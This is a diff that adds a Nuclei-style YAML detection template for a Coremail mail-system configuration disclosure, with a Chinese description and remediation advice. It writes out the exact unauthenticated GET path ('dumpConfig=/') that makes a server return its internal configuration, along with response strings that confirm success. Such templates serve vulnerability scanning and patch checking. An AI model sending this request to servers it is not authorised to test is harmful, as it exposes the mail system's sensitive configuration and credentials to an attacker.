@@ -1,0 +1,35 @@
+id: coremail-config-disclosure
+info:
+  name: Coremail Config Disclosure
+  author:
+  - l0ne1y
+  description: |-
+    Coremail论客邮件系统存在信息泄露漏洞
+    Coremail论客邮件系统是目前国内拥有邮箱使用用户最多的邮件系统。
+
+    Coremail论客邮件系统存在信息泄露漏洞，攻击者可利用该漏洞获取敏感信息。
+  severity: high
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    http://www.coremail.cn
+
+    临时修复方案：
+    1、去除页面中涉及的敏感信息
+    2、将敏感信息进行加密存储，非必要不可发送前端
+requests:
+- matchers:
+  - type: word
+    condition: or
+    words:
+    - <object name="cm_md_db">
+    - containerDefinitions
+    - <string name="User">coremail</string>
+    - <string name="EnableCoremailSmtp">
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/mailsms/s?func=ADMIN:appState&dumpConfig=/'
+  method: GET
